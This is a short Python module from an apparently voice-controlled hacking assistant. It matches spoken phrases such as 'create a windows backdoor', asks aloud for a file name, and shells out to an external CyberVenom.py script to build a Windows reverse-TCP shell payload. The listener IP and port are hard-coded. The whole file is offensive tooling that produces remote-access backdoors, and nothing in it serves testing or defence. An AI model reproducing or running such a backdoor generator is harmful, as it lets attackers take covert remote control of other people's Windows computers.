from Core.offensive_mode import listen_for_commands
from text_to_speech import speak
def generate_backdoor(ip, port, name):
    speak("Generating a windows payload")
    import os
    os.system("python3 /home/cybercrack/Cybercrack/CyberVenom.py -p windows/CyberShell/rev_tcp --LPORT {} --LHOST {} -f {}"
    .format(
        port,
        ip,
        name
    ))


def scan_to_find_out(command):
    possible_strings = [
        "create a backdoor",
        "create a windows backdoor",
        "i need to create a windows backdoor",
        "i need you to create a windows backdoor",
        "i need you to create me a windows backdoor",
        "i want you to create a windows backdoor",
        "i want you to create me a windows backdoor"
    ]
    for guess in possible_strings:
        if guess in command:
            return True

        else:
            continue
    return False


def supply_input():
    default_ip = "192.168.1.7"
    default_port = "2008"
    while True:
        speak("Tell me the name of the backdoor")
        name = listen_for_commands.listen(5)
        if name is None:
            speak("Please say a name sir")
        else:
            generate_backdoor(default_ip, default_port, name)
    

